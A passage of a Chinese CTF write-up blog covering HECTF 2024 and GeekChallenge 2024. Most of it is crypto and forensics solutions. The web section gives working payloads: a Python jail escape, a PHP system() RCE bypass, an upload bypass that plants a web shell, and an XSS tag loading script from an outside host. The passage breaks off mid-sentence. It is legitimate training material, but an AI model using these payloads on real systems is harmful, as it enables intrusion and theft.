19758181515666300263334531148587391869707566215385658759724970483060039216682585723722462835458856503531814316860237786892749700501436669071048571605926728917066797641628644730857333648930286503355701843365288276242984029888215453858844295912023305616753086127934173496355853797241944921600781294012353332277, 45576628433681427718167093217006549620067042472164439269014690121698560736312716407875326404496263261341269644373184438703912129559084380247641072914940830606649124606611794031719696797961847217643536070335745057048220615012019629278484208808353027070994021979997462190775853832457224157083880895894000484461]n = p*qEp = EllipticCurve(GF(p), [a, 0])y1 = Ep.lift_x(x1).xy()[1]G = Ep(x1,y1)P = Ep(Ep_point)&#x27;&#x27;&#x27;G2 = Gfor k in trange(1,60000): if G2 == P: print(k) break G2 += G&#x27;&#x27;&#x27;# 51517key = 51517assert P == key*Gk = md5(long_to_bytes(key)).hexdigest().encode()aes = AES.new(k, AES.MODE_ECB)En = EllipticCurve(Zmod(n), [a, b])# (2G).x ^ x0 = c0# (2G).y ^ x1 = c1# (4G).x ^ x2 = c2# (4G).x ^ x3 = c3P.&lt;x,y&gt;=PolynomialRing(Zmod(n))x0 = (c[0] &gt;&gt; 128) &lt;&lt; 128y0 = (c[1] &gt;&gt; 128) &lt;&lt; 128f = (x0+x)^3 + a*(x0+x) + b - (y0+y)^2r = small_roots(f, [2^128,2^128], m=4, d=3)x_2G = x0 + r[0][0]y_2G = y0 + r[0][1]P_2G = En(x_2G, y_2G)print(P_2G)x0 = (c[2] &gt;&gt; 128) &lt;&lt; 128y0 = (c[3] &gt;&gt; 128) &lt;&lt; 128f = (x0+x)^3 + a*(x0+x) + b - (y0+y)^2r = small_roots(f, [2^128,2^128], m=4, d=3)x_4G = x0 + r[0][0]y_4G = y0 + r[0][1]P_4G = En(x_4G, y_4G)print(P_4G)cc0 = int(P_2G.xy()[0]) ^^ c[0]cc1 = int(P_2G.xy()[1]) ^^ c[1]cc2 = int(P_4G.xy()[0]) ^^ c[2]cc3 = int(P_4G.xy()[1]) ^^ c[3]m = b&#x27;&#x27;for c_ in [cc0,cc1,cc2,cc3]: m += aes.decrypt(long_to_bytes(c_)) print(m)# b&#x27;30C270291b3da6c12ai341s5aNqaTtb2cd1ae2gA4e41319DEA876D6B896E0599&#x27; flag：HECTF&#123;30C270291b3da6c12ai341s5aNqaTtb2cd1ae2gA4e41319DEA876D6B896E0599&#125;。 ​ 情书与破碎的证书 小明喜欢上了小红，他使用rsa向小红发送了无数封含有中文字符的情书。终于小红忍不住了，找到了大嘿阔将小明的私钥证书打成碎片，移除了中间的内容并把上下段的私钥部分转化成16进制，以九个为一组用相同的方式打乱（转化时产生的0d0a换行符已被移除）。作为密码学大佬的你能恢复证书，找出小红忍无可忍的证据么？ 提示1 情书与破碎的证书 hint1:字符中含有中文 常规输出方法无效，请使用 PKCS1_OAEP 解密器，并使用 cipher.decrypt() 解密密文（毕竟考点是证书） pem内容16进制转字符，后面有 -----END PRIVATE KEY-----，是私钥文件。 根据 以九个为一组用相同的方式打乱（转化时产生的0d0a换行符已被移除），尝试分割： 123450d30000102bc048230010df78648862a090630a604820400050101018202000102a20482...... 按私钥格式为 3082 开头，可知前半部分是每9个字符逆序，后半部分不变。 还原： 12345first_rev = &#x27;0d30000102bc048230010df78648862a090630a604820400050101018202000102a20482238d771399dbbd0001416e7fbd7f589b44151fb0c984549c1c4d948984f85c35934453bfbb4dbb99420f63f9cb8f577a7b60d67bdf84166c500fa7d6c6e484b75d97e308151b31a49c5bd77dd1d2d6711e50d9f5f7bc37d4e2235cfd76a522713c766e240aa2eb5fb45a9015d1dbd6a58b5b28861233ae4eb75a97ced0b78e91024d195adde08f7430b7f160d1d60a4f9d0801db74ebc8c23f9397251faac5500d216acc623e8f6ab212b5e6e9495d5ef6cee995fea98f40b1db2d356dd3c4d2612c64a1295bb23936fad66dc5662cb4ba6a8929591f6b14ce30d67df5ec35edb1f0973f746bcc5fc1ca921ee9660e04c6f286677b92e12b61ba310501030219e5085e5254046204000182020100&#x27;first = &#x27;&#x27;.join([bytes.fromhex(first_rev[18*i:18*(i+1)])[::-1].hex() for i in range(len(first_rev)//18)])print(first)# 308204bc020100300d06092a864886f70d0101010500048204a6308204a20201000282010100bddb9913778d2315449b587fbd7f6e41944d1c9c5484c9b01fbf534493355cf88489cbf9630f4299bb4dbb84df7bd6607b7a578f84e4c6d6a70f506c16a4311b1508e3975db71e71d6d2d17dd75b9c23e2d437bcf7f5d9506e763c7122a576fd5c15905ab45feba20a241286285b8ba5d6dbd1b7d0ce975ab74eae338fe0dd5a194d02918e4f0ad6d160f1b730743fc2c8eb74db01089d210d50c5aa1f259793b512b26a8f3e62cc6a95e9cef65e5d49e9e66d352ddbb1408fa9fe5b29a1642c61d2c4d32c66c56dd6fa3639b2146b1f5929896abab4b1ed35ecf57dd630cecac15fcc6b743f97f086f2c6040e66e91e920531ba612be1927b6754525e08e519020301000102820100046204 按私钥格式拆分： 123456789101112131415161718192021222324252627282930313233343536前半段：308204bc020100300d06092a864886f70d0101010500048204a6308204a2020100【n】0282010100bddb9913778d2315449b587fbd7f6e41944d1c9c5484c9b01fbf534493355cf88489cbf9630f4299bb4dbb84df7bd6607b7a578f84e4c6d6a70f506c16a4311b1508e3975db71e71d6d2d17dd75b9c23e2d437bcf7f5d9506e763c7122a576fd5c15905ab45feba20a241286285b8ba5d6dbd1b7d0ce975ab74eae338fe0dd5a194d02918e4f0ad6d160f1b730743fc2c8eb74db01089d210d50c5aa1f259793b512b26a8f3e62cc6a95e9cef65e5d49e9e66d352ddbb1408fa9fe5b29a1642c61d2c4d32c66c56dd6fa3639b2146b1f5929896abab4b1ed35ecf57dd630cecac15fcc6b743f97f086f2c6040e66e91e920531ba612be1927b6754525e08e519【e】020301000102820100046204后半段：d48d90d80f【d mod (p-1)】02818051a5f7e7f4c050a50e18fde12fcee2646f2b43160b0c75ab4925e8269ae80e70cf12734f41fab18d0424ed7cceb7ddb27cbe0f554f7a6e1698d4ec5ba2b48d612e2337aeb75f8a57d8155a11d07b2c49d3d97c4ff0cfb89e6dd4f36cc37c010b5bc89356a39b576cc3edd03cdc4d791df5091a5571df1a6c15eedaa0773cf3cf【d mod (q-1)】0281800fc61f05d19c96eec3edcacca34e1d3e2cab439bebab6693a3ce2ca99f88ab9cdd183ceb8e801d8298f835359864ef191db3f53269976ba04b03606e540859decd05805c4aa79dc6db22380658eaf0bffba0f4e719bcf1b1e04169d8e0cb3af4d90b2e62d7c7ed3045d49b525ca715ca3b84f07b4ece27d04d1795299fa186cd【(inverse of q) mod p】02818025c20ab2529f1efd3d35347c573b282abfd95b264c92f6c4f9ec8b7c713206fbea1886880e29a36c47ef9bb753ce9567ea4d3e083c30f344022f95b7cd7114813bf6a28ecc67d5fe05953242684cd29c1c5dd8a74416890e5c943c70904ba70e349b15719a466f901fbf0cfc7840f8032e31afbccfb84f4a817ea51c8f90fd6a2d2d2d2d2d454e442050524956415445204b45592d2d2d2d2d 已知 $n,e,c,dp,dq,\\text{inv}(q,p)$，根据hint1，采用了OAEP加密方式，解密： 12345678910111213141516171819202122232425262728293031from Crypto.Util.number import *from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPn = 0x00bddb9913778d2315449b587fbd7f6e41944d1c9c5484c9b01fbf534493355cf88489cbf9630f4299bb4dbb84df7bd6607b7a578f84e4c6d6a70f506c16a4311b1508e3975db71e71d6d2d17dd75b9c23e2d437bcf7f5d9506e763c7122a576fd5c15905ab45feba20a241286285b8ba5d6dbd1b7d0ce975ab74eae338fe0dd5a194d02918e4f0ad6d160f1b730743fc2c8eb74db01089d210d50c5aa1f259793b512b26a8f3e62cc6a95e9cef65e5d49e9e66d352ddbb1408fa9fe5b29a1642c61d2c4d32c66c56dd6fa3639b2146b1f5929896abab4b1ed35ecf57dd630cecac15fcc6b743f97f086f2c6040e66e91e920531ba612be1927b6754525e08e519e = 0x010001dp = 0x51a5f7e7f4c050a50e18fde12fcee2646f2b43160b0c75ab4925e8269ae80e70cf12734f41fab18d0424ed7cceb7ddb27cbe0f554f7a6e1698d4ec5ba2b48d612e2337aeb75f8a57d8155a11d07b2c49d3d97c4ff0cfb89e6dd4f36cc37c010b5bc89356a39b576cc3edd03cdc4d791df5091a5571df1a6c15eedaa0773cf3cfdq = 0x0fc61f05d19c96eec3edcacca34e1d3e2cab439bebab6693a3ce2ca99f88ab9cdd183ceb8e801d8298f835359864ef191db3f53269976ba04b03606e540859decd05805c4aa79dc6db22380658eaf0bffba0f4e719bcf1b1e04169d8e0cb3af4d90b2e62d7c7ed3045d49b525ca715ca3b84f07b4ece27d04d1795299fa186cdc = 0x6f4cb0df50eb133f104727316eb23e25463b6b46a1ff743507c7663094da88a091c77c1d686a91613fa2da697c23924798b40654ba420b9690c5ceb9a362cf48e72c39177c6a3ebecc4e0ba2b9673f070a23e535fff7a01b400381ede60a6f9bf86047b3dd2c663c329b9287749bdb3783303802129b93af083aa2045c500fe0c2a7a018c2403881115927ae56ff14338b9fb98d5a5f461916d962aea7c3379ec7f7d8d77b4cc8ff756895c1500d9f2cee3552f17216339b0d67f27e0dd07e9ec1861f14c962b977559561d709d57e58fd6e6aafd27892c6d43d16b3db267902b9ce8f9ff89a66ab822b5ea3a68c872a32c69961df15581b70c00e4c61804d0dfor x in range(1, e): if e * dp % x == 1: p = (e * dp - 1) // x + 1 if n % p == 0: q = n // p break # print(p)# print(q)assert p * q == nf = (p-1)*(q-1)d = inverse(e,f)rsa_components = (n, e, d, p, q)myrsa = RSA.construct(rsa_components)rsakey = RSA.importKey(myrsa.exportKey())rsakey = PKCS1_OAEP.new(rsakey)m = rsakey.decrypt(long_to_bytes(c))print(m.decode())# 你知道么，rsa的大数分解的坚固就像爱情一样坚不可摧，你愿意让我们也像rsa一样坚不可摧么?但是你并不关心结局，你只关心你的flag:HECTF&#123;t1an_dog_no_g3t_g00d_d1e&#125; ​ MISC恶势力的仓库 恶势力的仓库惨遭毒手，就代表着毒手伸进了恶势力的仓库 wireshark分析。 查看HTTP流，在流14，a.jpg.php ，识别为蚁剑流量。 将各个流的POST数据去头去尾，base64解码。 流16列目录，流17提取出gif图，流18提取出png图，结尾有base64字符串，解码得： Although there is nothing here, I still have a hint prepared for you: perhaps you&#39;ve seen the password before!!! 流19提取出7z文件。 往前查看流，流7的POST数据： &#123;&quot;data&quot;:&#123;&quot;username&quot;:&quot;hue=8zZvR2YzlWb&quot;,&quot;password&quot;:&quot;YI6=ECZvd2YzlWb&quot;&#125;&#125; 疑似逆序base64，password的值逆序后解base64得到 miscgod!，以此为密码解开7z压缩包。 机密文件.xlsx 中单元格只有0/1两种值，将值为1的单元格全局替换为黑色，全局缩小调行高，是一个二维码，扫码得到flag：HECTF&#123;Y0u_are_m1sc_ggg9gggggggg9gggggggg9god&#125;。 ​ 2024HECTF俺来了！！！ 关注凌武科技公众号，发送2024HECTF俺来辣！！！，有神秘惊喜！！！ 公众号发关键词，flag：HECTF&#123;Welcome_To_2024_HECTF!!!&#125;。 ​ 简单的压缩包 w41tm00n是个kisaki推，某天在水群的时候，一个同为kisaki推的g01den在群里分享了个压缩包，并留言里面有一张kisaki的图，同时里面还存在着神秘的信息（这里是flag），w41tm00n对此很感兴趣，你可以帮他得到神秘的信息（flag）吗？ Re.txt 中提示：正则 ^([a-z])&#123;2&#125;\\d([^a-z])\\D$，生成字典文件： 12345678910111213141516import stringlcase = string.ascii_lowercaseucase = string.ascii_uppercasedigit = string.digitspunc = string.punctuationg = open(&#x27;dic.txt&#x27;,&#x27;w&#x27;)for a in lcase: for b in lcase: for c in digit: for d in ucase+digit+punc: for e in lcase+ucase+punc: f = a+b+c+d+e g.write(f) g.write(&#x27;\\n&#x27;) 用passware载入字典多进程爆破，得到密码 np76_，解压得到 kisaki.png，提取末尾的zip。 getZip.py 里面是AES-CBC加密： 1234567891011121314151617181920from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadimport binasciidef encrypt(key,iv): data = content cipher1 = AES.new(key, AES.MODE_CBC, iv) ct = cipher1.encrypt(pad(data, 16)) ct_hex = binascii.b2a_hex(ct) return ct_hexwith open(&quot;oringe.zip&quot;,&quot;rb&quot;) as f: content = f.read()key = b&quot;abcdefghijklmnop&quot;iv = b&quot;qwertyuiopasdfgh&quot;en = encrypt(key,iv)with open(&quot;zip2.zip&quot;,&quot;wb&quot;) as f: f.write(en) 解密data即可： 123key = b&quot;abcdefghijklmnop&quot;iv = b&quot;qwertyuiopasdfgh&quot;c = &#x27;cf5663613ce2bbd8ef6d3c522bcafa667ed985d67ba6ca2a21ce970c59e331dd7e090f248786c0ef8764395f1bb0aac136f1397d0a18ff55546473107fa7e5a385855cad91dda16ba4951e2f6618995b6faeecfaa1da7d3bd6ec66a4f57d6fae638a85da1cfdad89941512e9a0f7af49d33e285f4b56d66702ad4b4c1676824451125aaca20c1c74f9954d9546f9b5c059a990aae074c255cccf2866058ffa51159d6d0d67bfdbb3e233d27cb481709dd07fede7c9b28be6d7d581f2b7d476616cbc14a8133a23392eac733336d59cb42d6f5fe9a500eb340cf19dca8d6ddb47117d5a332f47b7fc260f4d1e1b8a2654b52d6403dc1376be22a6dcb9d8a72321acac5f63b59c8b82190629f644ee98757124d7883bfbe41df9d0b524e736da6bd0b54b37ce8c9b4f583b534052233a1a27f96be446e2f7e88eb2f8b4e0d84438546098c149d9ed511356726ff2bfdbdf&#x27; 解出zip直接查看 flag.txt 有flag：HECTF&#123;c292af1-2b2ee35-6398bd4934f7626afc&#125;。 ​ 恶势力的聊天记录 附件下载地址： 链接：https://pan.baidu.com/s/1bGEqgrRgqZ61U8TxAD7qNA 提取码：o07y volatility分析内存镜像文件： volatility -f image.vmem imageinfo volatility -f image.vmem --profile=Win7SP1x64 cmdline 结合题目，查到和微信相关的命令： 123&quot;C:\\Users\\aja\\AppData\\Roaming\\Tencent\\WeChat\\XPlugin\\Plugins\\RadiumWMPF\\11275\\extracted\\runtime\\WeChatAppEx.exe&quot; --log-level=2 --helper-handle-value=69441000 --wechat-files-path=&quot;C:\\Users\\aja\\Documents\\WeChat Files\\\\&quot; --product-id=1000 --wechat-sub-user-agent=&quot;MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090c11)&quot; --wmpf_extra_config=&quot;&#123; \\&quot;reportId\\&quot;:-1, \\&quot;version\\&quot;:11275 &#125;&quot; --web-translate --client_version=1661537297 --mojo-platform-channel-handle=2084&quot;C:\\Users\\aja\\AppData\\Roaming\\Tencent\\WeChat\\XPlugin\\Plugins\\ThumbPlayer\\4073\\extracted\\WeChatPlayer.exe&quot; --user-lib-dir=&quot;C:\\Program Files\\Tencent\\WeChat\\[3.9.12.17]&quot; --xlog_path=&quot;C:\\Users\\aja\\AppData\\Roaming\\Tencent\\WeChat\\log\\player&quot; --xlog_prefix=player --mojo-platform-channel-handle=3152 搜索： volatility -f image.vmem --profile=Win7SP1x64 filescan | findstr &quot;Desktop&quot; 有文件： 10x000000007e1b7660 5 0 RW---- \\Device\\HarddiskVolume2\\Users\\aja\\Desktop\\secretkey.zip 提取出来： volatility -f image.vmem --profile=Win7SP1x64 dumpfiles -D ./ -Q 0x000000007e1b7660 -n 得到 secretkey.zip，内有64个含md5值的文件。 结合题目，寻找微信的聊天记录数据库，参考：微信PC端数据库文件解密 主要讨论的数据库文件，存放于WeChat Files/wxid_xxxxx/Msg之中 搜索： volatility -f image.vmem --profile=Win7SP1x64 filescan | findstr &quot;Msg&quot; 有文件： 120x000000007da66710 2 1 RW-rw- \\Device\\HarddiskVolume2\\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\MSG0.db0x000000007dc9eac0 9 0 R--r-d \\Device\\HarddiskVolume2\\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\MSG0.db 提取出来： volatility -f image.vmem --profile=Win7SP1x64 dumpfiles -D ./ -Q 0x000000007da66710 -n 得到 MSG0.db。 参考：2022巅峰极客 - easy_Forensic 因为微信数据库是用256位的AES-CBC加密的，它的密钥是32位的，而gift文件里的编码进行解码后也是32位的,所以猜测这是一个被加密的数据库。 secretkey.zip内64个含md5值的文件，刚好对应64个16进制数，即32个字符。 参考脚本解密： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from Crypto.Cipher import AESimport hashlib, hmac, ctypes SQLITE_FILE_HEADER = bytes(&quot;SQLite format 3&quot;,encoding=&#x27;ASCII&#x27;) + bytes(1)#文件头IV_SIZE = 16HMAC_SHA1_SIZE = 20KEY_SIZE = 32DEFAULT_PAGESIZE = 4096 #4048数据 + 16IV + 20 HMAC + 12DEFAULT_ITER = 64000#yourkeydic = &#x27;0123456789abcdef&#x27;p = &#x27;&#x27;for i in range(64): f = open(f&#x27;secretkey/&#123;i&#125;&#x27;,&#x27;r&#x27;).read() for k in dic: if hashlib.md5(k.encode()).hexdigest() == f: p += k breakprint(p)password = bytes.fromhex(p)print(password)with open(r&#x27;MSG0.db&#x27;, &#x27;rb&#x27;) as f: blist = f.read()print(len(blist)) salt = blist[:16]#微信将文件头换成了盐key = hashlib.pbkdf2_hmac(&#x27;sha1&#x27;, password, salt, DEFAULT_ITER, KEY_SIZE)#获得Key first = blist[16:DEFAULT_PAGESIZE]#丢掉salt # import structmac_salt = bytes([x^0x3a for x in salt])mac_key = hashlib.pbkdf2_hmac(&#x27;sha1&#x27;, key, mac_salt, 2, KEY_SIZE) hash_mac = hmac.new(mac_key ,digestmod = &#x27;sha1&#x27;)#用第一页的Hash测试一下hash_mac.update(first[:-32])hash_mac.update(bytes(ctypes.c_int(1)))# hash_mac.update(struct.pack(&#x27;=I&#x27;,1))if (hash_mac.digest() == first[-32:-12]): print(&#x27;Correct Password&#x27;)else: raise RuntimeError(&#x27;Wrong Password&#x27;) blist = [blist[i:i+DEFAULT_PAGESIZE] for i in range(DEFAULT_PAGESIZE,len(blist),DEFAULT_PAGESIZE)]with open(r&#x27;out.db&#x27;, &#x27;wb&#x27;) as f: f.write(SQLITE_FILE_HEADER)#写入文件头 t = AES.new(key ,AES.MODE_CBC ,first[-48:-32]) f.write(t.decrypt(first[:-48])) f.write(first[-48:]) for i in blist: t = AES.new(key ,AES.MODE_CBC ,i[-48:-32]) f.write(t.decrypt(i[:-48])) f.write(i[-48:]) 用SQLiteSpy打开 out.db，在MSG表里面： 123通过网盘分享的文件：secret_.zip链接: https://pan.baidu.com/s/17Bt-vSpRpBLRuhTWaCgb6g?pwd=mfpt 提取码: mfpt --来自百度网盘超级会员v4的分享 取出 data_and_key.txt，有data和key，尝试AES、veracrypt、RC4，在RC4情况下解出jpg。 jpg末尾有zip，最后有提示：`hectf_[4number].zip，掩码爆破得到密码 hectf_7865，解压zip压缩包得到flag：HECTF&#123;Ez_WeCh@t_da7b45ef2e2b948dd22f4366fb536a46_S3cRet&#125;。 ​ Rem_YouRem_YOU.png，16进制查看，实际是jpg。 提取末尾的zip压缩包，解压，jigsaw文件夹有9个二维码碎片，拼接，扫描得到： JBCUGVCGPN2VMM3YPBRTOUZYNF4UETSUPB2GM6DWKBZE6N2SIZCTGZ2MOBZG6OLBGNAVOMSLKB6Q==== base32解码得flag：HECTF&#123;uV3xxc7S8iyBNTxtfxvPrO7RFE3gLpro9a3AW2KP&#125;。 ​ 快来反馈吧！！ 什么？！听说反馈就可以有flag？！！！！ https://www.wjx.cn/vm/wDLL4tY.aspx# 填问卷得flag：HECTF&#123;5L+d5L+d5ZCM5L2V5biI5Lq65Lus55qE5Y+C5LiO_ThankYouMasters&#125;。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2024赛","slug":"2024赛","permalink":"https://lazzzaro.github.io/tags/2024%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"GeekChallenge2024 第十五届极客大挑战","slug":"match-GeekChallenge2024-第十五届极客大挑战","date":"2024-11-06T13:31:12.000Z","updated":"2024-11-19T10:26:37.494Z","comments":true,"path":"2024/11/06/match-GeekChallenge2024-第十五届极客大挑战/","permalink":"https://lazzzaro.github.io/2024/11/06/match-GeekChallenge2024-%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/","excerpt":"","text":"​ 三叶草安全技术小组第十五届极客大挑战 极客大挑战是由三叶草安全技术小组自发组织举办的一场全国性网络安全赛事，目前，极客大挑战已成功举办十四届，吸引了超两万五千人次参加，累计提供超1000道赛题，广受全国各地参赛人员好评。作为国内最早一批举办的新生赛，极客大挑战一直以加强行业交流和提供优质学习平台为初心，为广大高校的信息安全学子提供了一个便捷的网络安全实战入门途径。 线上竞赛 10月18日20:00-11月18日20:00 Rank: 1 Week1Misc2024 geek challenge!签到 关注小组公众号三叶草小组Syclover,回复关键词 “2024 geek challenge!签到” 进行签到 公众号发关键词，flag：SYC&#123;weLc0mE-tO-2_o_2_100-GeeK@cha11Enge!!&#125;。 ​ ez_jpg 点击就送 base64+reverse+hex，改宽从528到628，图片里得到flag：SYC&#123;Steg_4nd_Zip_1s_G00d!&#125;。 ​ Truth of Word Word文件真正的奥妙 第一处： 打开docx文件，修改文字颜色，flag1：Flag01=SYC&#123;W0rd_H@5。 第二处： 提取宏代码：olevba vbaProject.bin，得到： 12345Sub Flag02()&#x27;&#x27; Flag02 宏&#x27;Flag = @_Ama1n9_&#x27; 第三处： 以压缩包形式打开docx，word/media 下有 flag03.png，flag3：FLAG03=StrUCtu3e!&#125;。 flag：SYC&#123;W0rd_H@5@_Ama1n9_StrUCtu3e!&#125;。 ​ Welcome_jail 就是一个简单的pyjail啦 用 chr() 函数连接拼凑字符串： 1234567def d(x): t=[] for k in x: t.append(f&#x27;chr(&#123;ord(k)&#125;)&#x27;) return &#x27;+&#x27;.join(t) print(d(&#x27;cat /home/ctf/flag&#x27;)) payload： print(&#123;&#125;.__class__.__mro__[1].__subclasses__()[-4].__init__.__globals__[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(104)+chr(111)+chr(109)+chr(101)+chr(47)+chr(99)+chr(116)+chr(102)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()) ​ 雪 又到了白色相簿的季节 zip末尾 VzNMQzBNNA==，base64解码得：W3LC0M4。 syclover_WaterMark.png 盲水印提取得：Th1si4st8eK3y，white.txt 再snow解密： stegsnow -C -p Th1si4st8eK3y white.txt 得flag：SYC&#123;Ma1by_y0u_w1ll_l1k3_sn0w&#125;。 ​ I_wanna_go_to_SYC BoBo人觉得iwanna很好玩，但是他打不过去能帮帮它吗？ 题目附件下载链接https://pan.baidu.com/s/1JCqJ8TkXBYJjPUVJbHMlvg 密码:game gm8decompiler转exe为gmk，再用gamemaker打开。 在 Rooms-sycroom 发现flag：SYC&#123;NO_PRObLEM_yOU_DO_It_G1Me_LOVER&#125;。 ​ Crypto凯撒加密 凯撒你了解吗？flag前缀为SYC{xx} YEI&#123;CKRIUSK_ZU_2024_MKKQ_INGRRKTMK&#125; ROT20得到：SYC&#123;WELCOME_TO_2024_GEEK_CHALLENGE&#125; ​ RSA 基础RSA，flag前缀为SYC{xx} 123456789101112n = 33108009203593648507706487693709965711774665216872550007309537128959455938833p = 192173332221883349384646293941837353967q = 172282016556631997385463935089230918399c = 5366332878961364744687912786162467698377615956518615197391990327680664213847e = 65537f =(p-1)*(q-1)d=inverse_mod(e,f)m=pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# SYC&#123;RSA_is_easy&#125; ​ X0R xor和^有什么区别呢，flag前缀为SYC{ 12345678910from Crypto.Util.number import *f1 = 4585958212176920650644941909171976689111990f2 = 3062959364761961602614252587049328627114908e2 = 10706859949950921239354880312196039515724907e1 = f2^e2enc = e1^f1print(long_to_bytes(enc))# b&#x27;mes)_c@3LHobXchblA&#x27; 根据flag头 SYC&#123;，异或得到key是 &gt;&lt;0R，异或 &gt;&lt;0R 得到 SYC&#123;a_part_0f_X0R&#125;。 ​ dp dp泄露，flag前缀为SYC{xx} 123456789101112131415161718192021222324import gmpy2 as gpc = 127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060n = 157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871e = 65537dp = 2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769for x in range(1, e): if(e*dp%x==1): p=(e*dp-1)//x+1 if(n%p!=0): continue q=n//p phin=(p-1)*(q-1) d=gp.invert(e, phin) m=gp.powmod(c, d, n) if(len(hex(m)[2:])%2==1): continue print(&#x27;--------------&#x27;) print(m) print(hex(m)[2:]) print(bytes.fromhex(hex(m)[2:])) # b&#x27;SYC&#123;welcome_to_crypto&#125;&#x27; ​ 共模攻击 共模攻击，flag前缀为SYC{xx} 12345678910111213141516171819202122232425262728import gmpy2 as gpdef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)n = 19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767e1 = 911e2 = 967c1 = 18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983c2 = 4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152 s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = gp.invert(c1, n)elif s2&lt;0: s2 = - s2 c2 = gp.invert(c2, n)m = pow(c1,s1,n)*pow(c2,s2,n) % nprint(hex(m)[2:])print(bytes.fromhex(hex(m)[2:]))# SYC&#123;U_can_really_attack&#125; ​ 不是套娃 一位旅行者兜兜转转，终能抵达终点——可能要多转几个弯，走错几块地 题目附件 https://pan.baidu.com/s/1YQuXvK7wNrhLoCUcmWEMZw 提取码：game 第一层： -..-/../-./..--.-/.---/../..--.-/--../../..--.-/.--/.-/..--.-/-.--/../..--.-/--../../..--.-/--/---/..--.-/-.--/../..--.-/-../..-/.-/..--.-/--../.. 摩斯密码：xin_ji_zi_wa_yi_zi_mo_yi_dua_zi 第二层： 1234567891011121314151617key &lt;- commanderKEY = uizrlbzii+ + + + + + + + + +uizrlbzii Rsm o o o Bcynirv+ + + + + + + + + +uizrlbzii+ + + + + + + + + +uizrlbzii Rsm+ + + + + + + + + +uizrlbzii Rsm+ + + + + + + + + +uizrlbzii+ + + + + + + + + +uizrlbzii Rsm o o Yoxx-nhw o Bcynirv+ + + + + + + + + + 可知 uizrlbzii 对应的是 commander，维吉尼亚密码解出key是 sunflower。 第三层： a1fdbce928af7aae，cmd5查询得到 HaiKav。 第四层： NEFICPIC&amp;CRTCTNEYO，栅栏密码key=3，得到 NICECTF&amp;NICECRYPTO。 第五层： tip: 100 -&gt; 13 -&gt; 64 -&gt; 65536 ，按照提示，base100+rot13+base64+base65536，得到 原神，启动！。 得到flag：SYC&#123;H0W_P3RF3C+_YU0_AR3!&#125;。 ​ Web100%的⚪ ⚪神启动 circle.html查看源代码中js代码： 1234if (score == 100) &#123; FfFlLLlllaaaaaggggg= atob(&quot;U1lDezVVY0hfQF9XbzBkM3JmVWxfQ2lSYzFlfQ==&quot;); alert(FfFlLLlllaaaaaggggg);&#125; Base64解码：SYC&#123;5UcH_@_Wo0d3rfUl_CiRc1e&#125;。 ​ rce_me Just rce me php常见绕过，payload： 123POST /?year=1e10&amp;purpose=rce%0a&amp;GLOBALS[code]=system(&quot;cat%20/flag&quot;);start=start%20now&amp;_[2024.geekchallenge.ctf=0e1290633704 ​ baby_upload Parar说他的黑名单无懈可击，GSBP师傅只花了十分钟就拿下了他的权限，你看看怎么绕过呢 文件上传，抓包，尝试发现只判断了第一次出现的 .php，双写绕过： 1234567891011121314------WebKitFormBoundaryIGjO2RImoANGbOwZContent-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php&quot;Content-Type: image/jpeg&lt;?php system($_GET[x]);------WebKitFormBoundaryIGjO2RImoANGbOwZContent-Disposition: form-data; name=&quot;name&quot;x.php.php------WebKitFormBoundaryIGjO2RImoANGbOwZContent-Disposition: form-data; name=&quot;submit&quot;上传------WebKitFormBoundaryIGjO2RImoANGbOwZ-- 再访问 uploads/x.php.php?x=cat /flag 得到flag。 ​ Problem_On_My_Web starven师傅想要向他的女神表白，所以他专门写了个表白墙用来写他的甜言蜜语，你能看看他的表白墙有什么问题吗 XSS攻击。 /form 页面提交script攻击代码：&lt;sCRiPt sRC=//xs.pe/maD&gt;&lt;/sCrIpT&gt;，再到 